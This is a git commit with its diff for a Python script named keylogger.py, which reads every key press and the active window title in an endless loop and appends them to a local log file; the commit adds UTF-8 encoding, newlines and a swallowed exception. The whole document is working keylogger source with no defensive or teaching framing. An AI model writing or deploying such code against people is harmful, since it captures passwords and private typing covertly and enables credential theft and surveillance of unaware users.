5fd06a04b6b890b6c1aacb5a17a3601a950e780e
Nadav Nir <73201814+NN-7@users.noreply.github.com>
2025-09-23 12:02:21 +0300

    Fixed an error with encoding when logging key presses by keylogger

--- keylogger.py
+++ keylogger.py
@@ -4,6 +4,9 @@ from win32gui import GetWindowText, GetForegroundWindow
 while True:
     entry = f"Key Pressed: {keyboard.read_key()} Active Window: {GetWindowText(GetForegroundWindow())}" # make the entry by detecting the pressed key and active window
     print(entry) # for debugging purposes
-    with open("log", "a") as log: # open the log file or make a new one if it doesnt exist
-        log.write(entry) # write the entry into the log
-    # Reads the key pressed and active window and writes it into a file.
+    try:
+        with open("log", "a", encoding='utf-8') as log: # open the log file or make a new one if it doesnt exist
+            log.write(entry+'\n') # write the entry into the log
+        # Reads the key pressed and active window and writes it into a file.
+    except UnicodeEncodeError as e:
+        pass
